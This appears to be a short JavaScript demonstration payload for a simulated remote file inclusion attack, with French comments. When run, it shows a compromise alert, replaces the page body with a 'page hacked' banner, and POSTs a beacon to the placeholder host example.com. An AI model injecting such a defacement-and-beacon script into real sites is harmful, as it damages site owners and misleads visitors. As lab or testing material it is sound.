alert("Attention ! Ce site a été compromis par une attaque RFI.");

document.body.innerHTML = "<h1>Cette page a été piratée !</h1>";

// Modifiez cette partie
fetch('http://example.com/report', {
    method: 'POST',
    body: JSON.stringify({ message: 'RFI attack simulated' }),
    headers: { 'Content-Type': 'application/json' },
    mode: 'no-cors' // Ajoutez cette ligne
}).then(() => {
    console.log('Requête envoyée avec succès');
}).catch((error) => {
    console.error('Erreur lors de l\'envoi de la requête', error);
});
